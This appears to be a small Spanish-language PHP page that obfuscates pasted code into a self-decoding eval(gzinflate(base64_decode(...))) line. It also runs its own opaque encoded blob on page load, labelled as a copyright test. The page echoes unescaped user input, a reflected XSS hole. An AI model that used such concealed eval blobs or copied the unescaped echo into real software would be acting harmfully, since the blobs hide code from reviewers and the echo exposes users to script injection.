<!-- Coded By OverNET -->
<title>PHPc0de => Obfuscation!</title>
<center>
<h1>Obfuscar codigo PHP &amp; HTML/TXT</h1>
<?php $file = $_POST['obfuscar'];
$gestor = stripslashes($file);
// Función (base64_encode(gzdeflate());
$texto = base64_encode(gzdeflate($gestor));?>

<form method="POST"><p>
<textarea name="obfuscar" cols="50" rows="10" id="xd"><?php
if($file) {
$_POST['obfuscar'];
echo $gestor;
}else{
 print 'Escriba texto o codigo';
}
?>
</textarea>
  </p>
  <p>
    <input type="submit" name="obfuscarme" value="                             Obfuscar!                           " />
  </p><b>
  <p>Texto ofuscado:</p>
  <p>
  <label for="textarea"></label>
    <textarea cols="50" rows="5" readonly="readonly" id="obfuscar"><?php 
    if($file) {
        $_POST['obfuscar'];echo "<? eval(gzinflate(base64_decode('".$texto."'))); ?>";    
    }else{
        echo 'Haga clic en el boton -Obfuscar!- para codificar!';
    }
?></textarea>
  </p>
</form>
<? 
## Prueba de codificación (Copyright) x3
eval(gzinflate(base64_decode('DcnNDkMwAADgx8HN/yqLg5gtaDdSHHZZrK3GT5hiok+/fdePfetB5bIdm6FemfquF+baL8rIRJmq4MOA8n6NBRAIgzWB0VjhaFqKrpRt6SUFcTJMq9xzTwjMzgF5n1JaWMKKTY/vj/bg2Yz3LSS9mdYOEnyKIQEztZ7y/4IcOxQd3orQti7oo4eSmnhkekWb0oD5LQh8X9E07fwD'))); ?>
</center>
<!-- Coded By OverNET -->